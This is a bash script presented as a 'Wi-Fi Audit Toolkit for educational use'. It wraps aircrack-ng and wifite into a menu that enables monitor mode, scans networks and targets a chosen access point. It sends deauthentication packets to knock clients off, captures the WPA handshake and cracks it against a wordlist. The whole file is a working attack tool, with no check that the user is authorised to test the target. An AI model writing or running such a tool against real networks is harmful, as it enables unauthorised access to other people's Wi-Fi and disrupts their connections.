#!/bin/bash

# Wi-Fi Audit Toolkit - For Educational Use Only
# Made by Anas (and some help from ChatGPT 😉)

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

echo -e "${GREEN}[*] Wi-Fi Audit Toolkit Starting...${NC}"

if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] Run this script as root (sudo).${NC}"
    exit
fi

for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng wifite; do
    if ! command -v $cmd &> /dev/null; then
        echo -e "${RED}[!] Missing: $cmd. Please install aircrack-ng and wifite.${NC}"
        exit
    fi
done

iface=$(iw dev | awk '$1=="Interface"{print $2}' | head -n1)
if [ -z "$iface" ]; then
    echo -e "${RED}[!] No wireless adapter found.${NC}"
    exit
fi
echo -e "${GREEN}[+] Found Wi-Fi interface: $iface${NC}"

airmon-ng check kill
airmon-ng start $iface
mon_iface="${iface}mon"
echo -e "${GREEN}[+] Monitor mode ON: $mon_iface${NC}"

while true; do
    echo -e "\n${GREEN}Main Menu:${NC}"
    echo "1) Scan Networks"
    echo "2) Capture Handshake & Crack"
    echo "3) Run Wifite (Auto Mode)"
    echo "4) Stop & Exit"
    read -p "Choose: " option

    case $option in
        1)
            echo -e "${GREEN}[*] Scanning... Ctrl+C to stop.${NC}"
            sleep 2
            airodump-ng $mon_iface
            ;;
        2)
            read -p "Target BSSID: " bssid
            read -p "Channel: " channel
            read -p "Save capture as (e.g. /root/handshake): " capfile
            read -p "Wordlist path: " wordlist

            gnome-terminal -- airodump-ng -c $channel --bssid $bssid -w $capfile $mon_iface &
            sleep 5
            echo -e "${GREEN}[*] Sending deauth packets...${NC}"
            aireplay-ng --deauth 10 -a $bssid $mon_iface
            echo -e "${GREEN}[*] Waiting...${NC}"
            sleep 15
            killall airodump-ng

            echo -e "${GREEN}[*] Cracking...${NC}"
            aircrack-ng "$capfile-01.cap" -w "$wordlist"
            ;;
        3)
            echo -e "${GREEN}[*] Starting Wifite...${NC}"
            wifite
            ;;
        4)
            airmon-ng stop $mon_iface
            service NetworkManager restart
            echo -e "${GREEN}[*] Exiting. Monitor mode stopped.${NC}"
            exit
            ;;
        *)
            echo -e "${RED}[!] Not a valid option.${NC}"
            ;;
    esac
done
